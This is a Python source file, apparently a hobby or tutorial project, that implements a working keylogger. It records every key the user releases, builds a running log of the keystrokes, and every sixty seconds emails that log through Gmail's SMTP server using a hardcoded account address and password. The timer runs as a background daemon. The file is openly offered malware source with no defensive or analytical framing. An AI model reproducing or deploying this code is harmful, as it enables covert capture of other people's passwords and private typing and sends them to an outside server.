import keyboard as k #allows us to access the keylogs as you type on the keyboard
import smtplib as s #allows us to use smtp protocol to send the emails containing the code
from threading import Timer as t #to allow a set amount of time to pass before continuing the execution
from datetime import datetime as d #to check the start time which helps in sending emails at intervals

#initialisisng parameters
timeinterval = 60
emailid = "kelogger321@gmail.com"
password = "hello32py"

#defining all the functions related to the keylogger in a class
class Keylogger:
    def __init__(self, interval):
        self.interval = interval
        self.log = "" #string variable that will contain all the keys pressed in the set time interval
        self.starttime = d.now()
        self.endtime = d.now() #stores the start and end time of the interval
        
        
    def callback(self, event): #invoked every time we press a key
        name = event.name
        if len(name) > 1: #checks to see that there has been some key pressed
            if name == "space": #assigning a sppace for every time the space bar is pressed
                name = " "
            elif name == "enter": #going to the next line whenever enter is pressed
                name = "[ENTER]\n"
            elif name == "decimal":
                name = "." #assigning a decimal point for whenever a decimal is entered
            else:
                name = name.replace(" ", "_") # replace spaces with underscores
                name = f"[{name.upper()}]"
        self.log += name  #adding the key pressed to the global string variable
        
        
    def sendemail(self, emailid, password, message): #sends the email
        server = s.SMTP(host="smtp.gmail.com", port=587) #connects to the SMTP server
        server.starttls() #connects in TLS mode for security
        server.login(emailid, password)  #logs in with given email id and password
        server.sendmail(emailid, emailid, message) #sends the message containing the keys pressed
        server.quit()  # terminates the session
        
        
    def report(self): #sends keylogs and resets global string variable, called after the interval each time
        if self.log: #checks that there is something in the global string variable
            self.endtime = d.now() #ending that particular log
            self.sendemail(emailid, password, self.log) #reporting the log that just finished
            self.starttime = d.now() #starting the new log
        self.log = "" #resetting the global string
        timer = t(interval=self.interval, function=self.report) #passing the interval and the report function to the class Timer
        timer.daemon = True #ensures the program runs in the background
        timer.start() # starts the timer
        
        
    def beginrecording(self):
        self.starttime = d.now() # records the start time
        k.on_release(callback=self.callback) # start the keylogger using onrelease function which basically records as soon as you lift your finger off a key
        self.report() # start reporting the keylogs
        k.wait() 
        
        
if __name__ == "__main__":  #initiating the class Keylogger which we have defined that contains the functions
    keylogger = Keylogger(interval=timeinterval)
    keylogger.beginrecording()